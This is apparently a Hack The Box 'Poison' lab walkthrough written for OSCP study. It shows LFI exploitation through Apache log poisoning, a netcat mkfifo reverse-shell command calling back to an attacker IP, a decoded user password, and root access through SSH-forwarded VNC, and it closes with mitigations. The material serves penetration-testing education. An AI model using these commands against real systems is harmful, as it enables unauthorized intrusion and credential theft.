---
title: Poison
date: 2025-06-04
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, LFI-Log-Poisoning, Apache, FreeBSD, VNC, vncviewer, vnc-passwd-decryptor] 
image: posion.png
media_subpath: /assets/img/posts/2025-06-04-poisonHTB/
---

## Introduction

**Poison** is an easy-rated Linux machine that begins with a classic **Local File Inclusion (LFI)** vulnerability. I exploited the LFI via **log poisoning**, injecting PHP code into the logs and then including the log file to gain a web shell. Further enumeration revealed a lightly obfuscated password in a file, which I decoded to obtain **SSH access** as the user. On the user account, I discovered a **VNC service running as root** on localhost and a **password-protected ZIP archive**. After extracting credentials from the archive, I **forwarded the VNC port** using SSH and connected to it, gaining **root access** through the desktop session.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version: OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)

Accessing the website we are greeted with:

![image.png](image%202.png)

We `.php` file is supplied it just displays it:

![image.png](image%203.png)

## Exploitation

I see here potential LFI vulnerability I am gonna check for it.

**Gobuster Scan**

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 400,403,404
```

![image.png](image%204.png)

![image.png](image%205.png)

Remote Full Inclusion does not work, because of the options is disabled.

I am gonna check it with `ffuf` first capturing request using `BurpSuite`

![image.png](image%206.png)

 copying it to the current directory and then, using it in a command:

```bash
ffuf -request lfi-request -request-proto http -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -ac
```

![image.png](image%207.png)

![image.png](image%208.png)

Using `filter` wrapper I can see the source code of `browse.php`:

`http://10.10.10.84/browse.php?file=php://filter/read=convert.base64-encode/resource=browse.php`

![image.png](image%209.png)

It is encoded in base64 it decodes to:

```php
<?php
include($_GET['file']);
?>
```

What can I do here is to perform `Log Poisoning` before that I should find where `access.log` or `error.log` is located.

Searching for it in Google I found that `access.log` file for FreeBSD OS is located in `/var/log/httpd-access.log`.

![image.png](image%2010.png)

Testing it I see that it really is:

![image.png](image%2011.png)

Location of `error.log -> var/log/httpd-error.log`:

![image.png](image%2012.png)

To perform Server Log Poisoning first change the user agent to `PHP Webshell`:

![image.png](image%2013.png)

After sending the request delete the User-Agent header because we don’t want the command be executed twice and send the command appending to request `&cmd=<command>`:

![image.png](image%2014.png)

You see it works:

![image.png](image%2015.png)

Now let’s try to get a reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.34 443 >/tmp/f
```

![image.png](image%2016.png)

![image.png](image%2017.png)

I wanted to make it interactive using python, perl and ruby but didn’t find neither of them, then I used:

```bash
/bin/csh -i
```

## Lateral Movement to charix

I see the `pwdbackup.txt` file in this directory:

![image.png](image%2018.png)

I see that it is `Base64` encoded and I decoded it repeteadly.

![image.png](image%2019.png)

and it really worked;

![image.png](image%2020.png)

## Privilege Escalation

Let’s connect to the machine using `ssh`.

I see the file called `secret.zip` tried to unzip it 

![image.png](image%2021.png)

Let’s transfer it over our machine and try to crack it:

```bash
scp charix@10.10.10.84:/home/charix/secret.zip secret.zip
```

First let’s convert it in a format that is crackable by john:

```bash
zip2john secret.zip > secret.hash
```

But this didn’t work, it turns out user `charix` password is the master password for achive using it I extracted a secret file.

Running file command on the secret file I see the encoding:

`secret: Non-ISO extended-ASCII text, with no line terminators`

- OSCP Checklist
    - [ ]  Situational awareness 
    - [ ]  Exposed Confidential Information 
    - [ ]  Password Authentication Abuse 
    - [ ]  Hunting Sensitive Information
    - [x]  Sudo [Sudo(OSCP)]
    - [x]  SUID/SGID [SUID & SGID Executables(OSCP)]
    - [ ]  Capabilities [Capabilities(OSCP)]
    - [ ]  Cron Jobs Abuse [Cron Jobs Abuse(OSCP)]
    - [ ]  Kernel Exploits [Kernel Exploits(OSCP)]
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    - [ ]  Check running processes using `pspy`
    

I couldn’t find sudo, SUID binaries, then while manual enumeration I noticed VNC port `5901` is open locally, I cannot find `vncviewer` too, so I am gonna try to perform port forwarding and access it from attack machine, I can use SSH Local Port Forwarding:

We can see it is run as root:

```bash
ps aux
```

![image.png](image%2022.png)

```bash
ssh -L  5901:127.0.0.1:5901 charix@$IP
```

And as we know `vncviewer` will request a password file, I am gonna supply secret file to it.

```bash
vncviewer -passwd secret 127.0.0.1:5901
```

As you can see now we are root:

![image.png](image%2023.png)

VNC password file can also be decrypted using [scripts](https://github.com/trinitronx/vncpasswd.py) that are available out there.

## Credentials

```bash
charix : Charix!2#4%6&8(0
```

## Mitigation

- **Sanitize user input** to prevent LFI and log poisoning; use whitelisting and proper path handling.
- Avoid storing **plaintext or reversible encoded passwords**; use salted hashes and secrets management tools.
- Restrict **VNC access** and avoid running it as root; if necessary, enforce strong authentication and network restrictions.
- Regularly audit and limit **SSH and service exposure**, especially for services bound to localhost with elevated privileges.
- Use **file permission hardening** to prevent unauthorized access to sensitive files (like zipped archives containing credentials).
